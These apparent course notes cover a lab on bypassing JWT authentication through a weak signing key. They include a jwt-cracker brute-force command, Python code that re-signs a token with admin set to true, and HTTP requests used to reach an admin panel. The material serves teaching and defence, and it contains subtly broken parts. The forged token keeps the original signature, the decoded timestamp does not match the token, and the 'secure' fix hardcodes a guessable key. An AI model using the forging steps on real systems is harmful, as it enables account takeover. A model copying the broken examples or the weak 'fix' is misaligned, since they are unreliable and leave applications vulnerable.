---
course: Web Security
topic: JWT Attacks
tags: [web-security]
---

## Introduction to JWT Attacks

JSON Web Tokens (JWTs) are a widely used method for transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed. JWTs can be signed using a secret (with the HMAC algorithm) or a public/private key pair using RSA or ECDSA.

### What is a JWT?

A JWT consists of three parts separated by dots (`.`):

1. **Header**: Contains metadata about the token, such as the type of token and the signing algorithm being used.
2. **Payload**: Contains the claims, which are statements about an entity (typically the user) and additional data.
3. **Signature**: Used to verify the integrity of the message and ensure that the token has not been tampered with.

Here is an example of a JWT:

```plaintext
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MzEwMDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

Breaking it down:

- **Header**:
  ```json
  {
    "alg": "HS256",
    "typ": "JWT"
  }
  ```

- **Payload**:
  ```json
  {
    "sub": "1234567890",
    "name": "John Doe",
    "iat": 1516239022
  }
  ```

- **Signature**:
  ```plaintext
  SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
  ```

### Why JWTs Matter

JWTs are crucial for web applications because they provide a secure way to transmit information between parties. They are commonly used for authentication and authorization purposes. However, their security heavily depends on the strength of the signing key and the implementation details.

### How JWTs Work Under the Hood

When a user logs in, the server generates a JWT and sends it back to the client. The client stores this token and includes it in subsequent requests to the server. The server verifies the signature of the token to ensure its authenticity and extracts the claims to determine the user's identity and permissions.

#### Signing Algorithms

The most common signing algorithms are:

- **HMAC (HS256)**: Uses a symmetric key for both signing and verification.
- **RSA (RS256)**: Uses an asymmetric key pair (public and private keys).

### Weak Signing Key Vulnerability

One of the most critical vulnerabilities associated with JWTs is the use of a weak signing key. If the key is too short or predictable, an attacker can brute-force the key and forge tokens.

### Real-World Example: CVE-2021-3278

In 2021, a vulnerability was discovered in the `jwt-go` library, which is widely used in Go applications. The vulnerability allowed attackers to bypass signature validation by manipulating the token's payload. This led to unauthorized access and privilege escalation.

### Steps to Exploit Weak Signing Key

1. **Identify the JWT**: Capture the JWT from the network traffic.
2. **Brute Force the Secret Key**: Use tools like `jwt-cracker` to guess the secret key.
3. **Modify the Token**: Change the payload to grant administrative privileges.
4. **Sign the Modified Token**: Use the brute-forced secret key to sign the modified token.
5. **Access the Admin Panel**: Use the forged token to access restricted areas.

### Tools and Techniques

#### Burp Suite

Burp Suite is a popular tool for web application security testing. It includes features like the built-in browser and extensions like the JWT Editor.

#### JWT Editor Extension

The JWT Editor extension allows you to easily view and manipulate JWTs within Burp Suite.

### Example Scenario

Let's walk through the scenario described in the lecture transcript.

#### Step 1: Access the Lab

1. Open Burp Suite and navigate to the built-in browser.
2. Ensure that your requests are being intercepted by the Burp proxy.

#### Step 2: Log In with Regular User Credentials

1. Navigate to the login page.
2. Enter the username and password (`Peter`).
3. Submit the login form.

#### Step 3: Identify the JWT

1. Observe the requests in the Burp proxy.
2. Look for the JWT in the request headers or body.

#### Step 4: Brute Force the Secret Key

1. Use a tool like `jwt-cracker` to guess the secret key.
2. Configure the tool with the captured JWT and start the brute-force process.

#### Step 5: Modify the Token

1. Once the secret key is found, use a JWT manipulation tool to change the payload.
2. Set the `admin` claim to `true`.

#### Step 6: Sign the Modified Token

1. Use the brute-forced secret key to sign the modified token.
2. Replace the original token with the new one in the request.

#### Step 7: Access the Admin Panel

1. Use the forged token to access the admin panel.
2. Perform actions like deleting the `Carlos` user.

### Full Example Code

#### Capturing the JWT

```http
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=Peter&password=Peter
```

Response:

```http
HTTP/1.1 200 OK
Set-Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MzEwMDIyLCJhZG1pbiI6ZmFsc2V9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c; Path=/
```

#### Brute Forcing the Secret Key

```bash
jwt-cracker -t eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MzEwMDIyLCJhZG1pbiI6ZmFsc2V9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c -w wordlist.txt
```

#### Modifying the Token

```python
import jwt

# Original token
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MzEwMDIyLCJhZG1pbiI6ZmFsc2V9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

# Secret key
secret_key = "my_secret_key"

# Decode the token
decoded_token = jwt.decode(token, secret_key, algorithms=["HS256"])

# Modify the payload
decoded_token["admin"] = True

# Encode the modified token
modified_token = jwt.encode(decoded_token, secret_key, algorithm="HS256")

print(modified_token)
```

#### Accessing the Admin Panel

```http
GET /admin HTTP/1.1
Host: example.com
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MzEwMDIyLCJhZG1pbiI6dHJ1ZX0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

### How to Prevent / Defend Against JWT Attacks

#### Detection

- **Monitor JWT Usage**: Use logging and monitoring tools to track JWT usage patterns.
- **Anomaly Detection**: Implement anomaly detection systems to identify unusual activities related to JWTs.

#### Prevention

- **Use Strong Keys**: Ensure that the secret key is sufficiently strong and unpredictable.
- **Limit Token Lifetime**: Set a short expiration time for JWTs to minimize the window of opportunity for attacks.
- **Use Secure Storage**: Store JWTs securely in HTTP-only cookies to prevent access via JavaScript.

#### Secure Coding Fixes

##### Vulnerable Code

```python
import jwt

# Original token
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MzEwMDIyLCJhZG1pbiI6ZmFsc2V9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

# Secret key
secret_key = "weak_key"

# Decode the token
decoded_token = jwt.decode(token, secret_key, algorithms=["HS256"])
```

##### Secure Code

```python
import jwt

# Original token
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MzEwMDIyLCJhZG1pbiI6ZmFsc2V9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

# Strong secret key
secret_key = "strong_secret_key"

# Decode the token
decoded_token = jwt.decode(token, secret_key, algorithms=["HS256"])
```

#### Configuration Hardening

- **Disable Insecure Algorithms**: Ensure that insecure algorithms like `none` are disabled.
- **Enable HTTPS**: Always use HTTPS to encrypt the transmission of JWTs.

### Mermaid Diagrams

#### JWT Flow Diagram

```mermaid
sequenceDiagram
    participant User
    participant Server
    participant Attacker
    
    User->>Server: Login Request (Username, Password)
    Server-->>User: JWT (Signed with Secret Key)
    User->>Attacker: Intercept JWT
    Attacker->>Attacker: Brute Force Secret Key
    Attacker->>Attacker: Modify JWT Payload
    Attacker->>Attacker: Sign JWT with Secret Key
    Attacker->>Server: Access Admin Panel (Forged JWT)
    Server-->>Attacker: Admin Panel Response
```

### Practice Labs

For hands-on practice with JWT attacks, consider the following labs:

- **PortSwigger Web Security Academy**: Offers detailed labs on JWT manipulation and attacks.
- **OWASP Juice Shop**: Provides a vulnerable web application for practicing various security techniques, including JWT attacks.
- **DVWA (Damn Vulnerable Web Application)**: A deliberately insecure web application for practicing web hacking techniques.

By thoroughly understanding the concepts, tools, and techniques involved in JWT attacks, you can better protect your applications from such vulnerabilities.

---
<!-- nav -->
[[Web Security (PortSwigger)/19-JWT Attacks/03-Lab 3 JWT authentication bypass via weak signing key/00-Overview|Overview]] | [[02-Introduction to JWT Authentication Bypass via Weak Signing Key|Introduction to JWT Authentication Bypass via Weak Signing Key]]
